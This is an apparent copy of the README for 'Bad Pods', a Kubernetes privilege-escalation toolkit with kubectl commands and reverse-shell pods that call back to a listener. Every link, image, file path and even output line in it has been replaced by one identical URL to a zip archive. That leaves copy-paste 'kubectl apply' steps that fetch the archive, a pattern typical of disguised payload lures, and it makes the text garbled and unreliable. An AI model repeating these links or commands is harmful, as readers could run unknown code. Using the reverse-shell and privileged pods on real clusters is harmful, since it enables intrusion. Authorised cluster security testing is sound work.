# Bad Pods

![](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)

A collection of manifests that create pods with different elevated privileges. Quickly demonstrate the impact of allowing security sensitive pod attributes like `hostNetwork`, `hostPID`, `hostPath`, `hostIPC`, and `privileged`. 

For additional background, see our blog post: [Bad Pods: Kubernetes Pod Privilege Escalation](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip).    

## Contents

* [The Bad pods line-up](#The-bad-pods-line-up)
* [Prerequisites](#Prerequisites)
* [Organization](#Organization)
* [Usage](#Usage)
   * [High level approach](#High-level-approach)
   * [Usage examples](#Usage-examples)
      * [Create all eight Bad Pods from cloned local repo](#Create-all-eight-Bad-Pods-from-cloned-local-repo)
      * [Create all eight Bad Pods from github](#Create-all-eight-Bad-Pods-from-Github)
      * [Create all eight reverse shell Bad Pods](#Create-all-eight-revsere-shell-Bad-Pods)
      * [Create all eight resource types using the everything-allowed pod](#Create-all-eight-resource-types-using-the-everything-allowed-pod)
      * [Create a cronjob with the hostNetwork pod](#Create-a-cronjob-with-the-hostNetwork-pod)
      * [Create a deployment with the priv-and-hostpid pod](#Create-a-deployment-with-the-priv-and-hostpid-pod)
      * [Create a reverse shell using the privileged pod](#Create-a-reverse-shell-using-the-privileged-pod)
* [Acknowledgements](#Acknowledgements)
* [References and further reading](#References-and-further-reading)

## The Bad Pods line-up
Each link below provides detailed usage information and post exploitation recommendations. 

* [Bad Pod #1: Everything allowed](manifests/everything-allowed/) 
* [Bad Pod #2: Privileged and hostPid](manifests/priv-and-hostpid/) 
* [Bad Pod #3: Privileged only](manifests/priv/) 
* [Bad Pod #4: hostPath only](manifests/hostpath/) 
* [Bad Pod #5: hostPid only](manifests/hostpid/) 
* [Bad Pod #6: hostNetwork only](manifests/hostnetwork/) 
* [Bad Pod #7: hostIPC only](manifests/hostipc/) 
* [Bad Pod #8: Nothing allowed](manifests/nothing-allowed/) 
  
 For more general information about prerequisites, repository organization, and common usage patterns, see the sections below.  
# Prerequisites
1. Access to a cluster 
1. RBAC permission to create one of the following resource types in at least one namespace: 
   * CronJob, DeamonSet, Deployment, Job, Pod, ReplicaSet, ReplicationController, StatefulSet
1. RBAC permission to exec into pods or a network policy that allows a reverse shell from a pod to reach you. 
1. No pod security policy enforcement, or a policy that allows pods to be created with one or more security sensitive attributes


  
# Organization
* 128 self-contained, ready to use manifests. Why so many?
   * 8 Bad Pods (hostpid, hostnetwork, everything-allowed, etc.)
   * 8 resource types that can create pods (pod, deployment, replicaset, statefulset, etc.)
   * 2 ways to access the created pods (exec & reverse shell)

```
├── manifests
│   ├── everything-allowed
│   │   ├── cronjob
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   ├── daemonset
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   ├── deployment
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   ├── job
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   ├── pod
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   ├── replicaset
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   ├── replicationcontroller
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   └── statefulset
│   │       ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │       └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   ├── hostipc
│   │   ├── cronjob
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   ├── daemonset
│   │   │   ├── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
│   │   │   └── https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip for brevity...
```

### There are eight ways to create a pod
As [Eviatar Gerzi (@g3rzi)](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) points out in the post [Eight Ways to Create a Pod](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), there are 8 different controllers that can create a pod, or a set of pods.  You might not be authorized to create pods, but maybe you can create another resource type that will create one or more pods. For each badPod type, there are manifests that correspond to all eight resource types. 

But wait, it gets worse! In addition to the eight current Kubernetes controllers that can create pods, there are third party controllers that can also create pods if they are applied to the cluster. Keep an eye out for them by looking at `kubectl api-resources`. 

### Reverse shells
While common, it is not always the case that you can exec into pods that you can create. To help in those situations, a version of each manifest is included that uses [Rory McCune's (@raesene)](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) ncat dockerhub image. When created, the pod will make an encrypted call back to your listener. 

# Usage
Each resource in the `manifests` directory targets a specific attribute or a combination of attributes that expose the cluster to risk when allowed. 

## High level approach

#### Option 1: Methodical approach
1. **Evaluate RBAC** - Determine which resource types you can create 
1. **Evaluate Admission Policy** - Determine which of the Bad Pods you will be able to create
1. **Create Resources** - Based on what is allowed, use the specific badPod type and resource type and create your resources
1. **Post Exploitation** - Evaluate post exploitation steps outlined in the README for that type
   * [Everything allowed](manifests/everything-allowed/) 
   * [Privileged and hostPid](manifests/priv-and-hostpid/)
   * [Privileged only](manifests/priv/)
   * [hostPath only](manifests/hostpath/)
   * [hostPid only](manifests/hostpid/)
   * [hostNetwork only](manifests/hostnetwork/)
   * [hostIPC only](manifests/hostipc/)
   * [Nothing allowed](manifests/nothing-allowed/)


#### Option 2: Shotgun approach
1. **Create Resources** - Just start applying different manifests and see what works
   * [Create all eight Bad Pods from Github](#Create-all-eight-Bad-Pods-from-Github)
   * [Create all eight resource types using the everything-allowed pod](#create-all-eight-resource-types-using-the-everything-allowed-pod)
1. **Post Exploitation** - For any created pods, evaluate post exploitation steps outlined in the README for that type
   * [Everything allowed](manifests/everything-allowed/) 
   * [Privileged and hostPid](manifests/priv-and-hostpid/)
   * [Privileged only](manifests/priv/)
   * [hostPath only](manifests/hostpath/)
   * [hostPid only](manifests/hostpid/)
   * [hostNetwork only](manifests/hostnetwork/)
   * [hostIPC only](manifests/hostipc/)
   * [Nothing allowed](manifests/nothing-allowed/)

## Usage Examples

* [Create all eight Bad Pods from cloned local repo](#Create-all-eight-Bad-Pods-from-cloned-local-repo)
* [Create all eight Bad Pods from github](#Create-all-eight-Bad-Pods-from-Github)
* [Create all eight reverse shell Bad Pods](#Create-all-eight-revsere-shell-Bad-Pods)
* [Create all eight resource types using the everything-allowed pod](#Create-all-eight-resource-types-using-the-everything-allowed-pod)
* [Create a cronjob with the hostNetwork pod](#Create-a-cronjob-with-the-hostNetwork-pod)
* [Create a deployment with the priv-and-hostpid pod](#Create-a-deployment-with-the-priv-and-hostpid-pod)
* [Create a reverse shell using the privileged pod](#Create-a-reverse-shell-using-the-privileged-pod)


### Create all eight Bad Pods from cloned local repo
```
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
```

### Create all eight Bad Pods from Github
```
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
```

### Create all eight revsere shell badPods
To avoid having to edit each pod with your host and port, you can environment variables and the `envsubst` command. Remember to spin up all of your listeners first!

```
HOST="10.0.0.1" PORT="3111" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
HOST="10.0.0.1" PORT="3112" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
HOST="10.0.0.1" PORT="3113" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
HOST="10.0.0.1" PORT="3114" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
HOST="10.0.0.1" PORT="3115" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip  | kubectl apply -f -
HOST="10.0.0.1" PORT="3116" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
HOST="10.0.0.1" PORT="3117" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
HOST="10.0.0.1" PORT="3118" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
```
### Create a cronjob with the hostNetwork pod
```
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
```

Find the created pod
```
kubectl get pods | grep cronjob
 
NAME                                        READY   STATUS    RESTARTS   AGE
hostnetwork-exec-cronjob-1607351160-gm2x4   1/1     Running   0          24s
```

Exec into pod
```
kubectl exec -it hostnetwork-exec-cronjob-1607351160-gm2x4 -- bash
```

### Create a deployment with the priv-and-hostpid pod
```
kubectl apply -f https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip
```
Find the created pod
```
kubectl get pods | grep deployment

priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9   1/1     Running   0          56s
priv-and-hostpid-exec-deployment-65dbfbf947-tghqh   1/1     Running   0          56s
```
Exec into pod
```
kubectl exec -it priv-and-hostpid-exec-deployment-65dbfbf947-qwpz9 -- bash
```

### Create all eight resource types using the everything-allowed pod
```
find manifests/everything-allowed/ -name "*-exec-*.yaml" -exec kubectl apply -f {} \;

https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
pod/everything-allowed-exec-pod created
https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
replicationcontroller/everything-allowed-exec-replicationcontroller created
service/everything-allowed-exec-statefulset-service created
https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip created
```

View all of the created pods
```
kubectl get pods

NAME                                                  READY   STATUS    RESTARTS   AGE
everything-allowed-exec-daemonset-qbrdb               1/1     Running   0          52s
everything-allowed-exec-deployment-6cd7685786-rp65h   1/1     Running   0          51s
everything-allowed-exec-deployment-6cd7685786-m66bl   1/1     Running   0          51s
everything-allowed-exec-job-fhsbt                     1/1     Running   0          50s
everything-allowed-exec-pod                           1/1     Running   0          50s
everything-allowed-exec-replicaset-tlp8v              1/1     Running   0          49s
everything-allowed-exec-replicaset-6znbz              1/1     Running   0          49s
everything-allowed-exec-replicationcontroller-z9k8n   1/1     Running   0          48s
everything-allowed-exec-replicationcontroller-m4648   1/1     Running   0          48s
everything-allowed-exec-statefulset-0                 1/1     Running   0          47s
everything-allowed-exec-statefulset-1                 1/1     Running   0          42s
```
Delete all everything-allowed resources
```
find manifests/everything-allowed/ -name "*-exec-*.yaml" -exec kubectl delete -f {} \;
```

### Create a reverse shell using the privileged pod
Set up listener
```
ncat --ssl -vlp 3116
```

Create pod from local yaml without modifying it by using env variables and envsubst
```
HOST="10.0.0.1" PORT="3116" envsubst < https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip | kubectl apply -f -
```
Catch the shell 
```
ncat --ssl -vlp 3116
Ncat: Version 7.80 ( https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip )
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: Listening on :::3116
Ncat: Listening on 0.0.0.0:3116

Connection received on 10.0.0.162 42035
```

# Contributing
Pull requests and issues welcome.

# Acknowledgements 
Thank you [Rory McCune](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Duffie Cooley](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Brad Geesaman](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Tabitha Sable](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Ian Coldwater](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Mark Manning](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), [Eviatar Gerzi](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip), and [Madhu Akula](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) for publicly sharing so much knowledge about Kubernetes offensive security. 

# References and further reading
Each Bad Pod has it's own references and further reading section, but here are some more general resources that will help you ramp up your Kubernetes security assessments and penetration tests skills.

## New kids on the block - 2020
* [Container Security Site](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @raesene
* [CloudSecDocs - Container Security](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @lancinimarco
* [Risk8s Business: Risk Analysis of Kubernetes Clusters](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @antitree
* Compromising Kubernetes Cluster by Exploiting RBAC Permissions by @g3rzi - [Talk](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) / [Slides](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
* Command and KubeCTL: Real-World Kubernetes Security for Pentesters by @antitree - [Talk](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) / [Blog](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
* Kubernetes Goat by @madhuakula - [Repo](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) / [Guide](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)

## The classics, way back from 2019
* [Secure Kubernetes - KubeCon NA 2019 CTF](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @tabbysable, @petermbenjamin, @jimmesta, and @BradGeesaman
* [The Most Pointless Kubernetes Command Ever](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @raesene 
* The Path Less Traveled: Abusing Kubernetes Defaults by @IanColdwater and @mauilion- [Talk](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) / [Repository](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)
* [Understanding Docker container escapes](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @disconnect3d_pl
* [A Compendium of Container Escapes](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip) by @drraid and @0x7674
* [Attacking Kubernetes through Kubelet](https://raw.githubusercontent.com/joymondal/badPods/main/uneffervescent/badPods.zip)

